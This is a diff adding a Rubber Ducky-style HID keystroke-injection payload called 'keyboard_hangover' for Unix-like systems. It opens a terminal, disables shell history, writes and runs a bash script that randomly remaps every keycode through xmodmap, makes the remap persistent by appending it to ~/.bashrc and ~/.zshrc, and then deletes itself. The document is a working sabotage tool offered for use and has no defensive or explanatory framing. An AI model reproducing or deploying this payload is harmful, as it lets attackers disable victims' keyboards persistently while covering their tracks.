@@ -1,0 +1,22 @@
+REM Title: keyboard_hangover
+REM Description: keyboard_hangover is a powerful payload which randomly remaps target's keyboard..
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution.
+REM Target: Unix-like operating systems.
+REM Attackmodes: HID
+
+DELAY 1000
+CTRL ALT t
+DELAY 500
+STRING unset HISTFILE 
+ENTER
+DELAY 100
+STRING echo -e "#\!/bin/bash\n\nmapping_file=\"/var/tmp/system\"\n\nkeycodes=(\$(seq 8 255))\ncharacters=(\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 1 | head -n \${#keycodes[@]}))\n\nmapping_content=""\nfor((i=0; i<\${#keycodes[@]}; i++)); do\n\tkeycode=\${keycodes[i]}\n\tchar=\${characters[i]}\n\tmapping_content+=\"keycode \$keycode = \$char\\\n\"\ndone\n\necho -e \$mapping_content > \$mapping_file\n\nls -a ~/ | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"xmodmap /var/tmp/system\" >> ~/.zshrc\nfi\nls -a ~/ | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"xmodmap /var/tmp/system\" >> ~/.bashrc\nfi" > /tmp/sys
+ENTER
+DELAY 200
+STRING chmod +x /tmp/sys
+ENTER
+DELAY 200
+STRING /tmp/./sys && rm /tmp/sys && exit
+ENTER
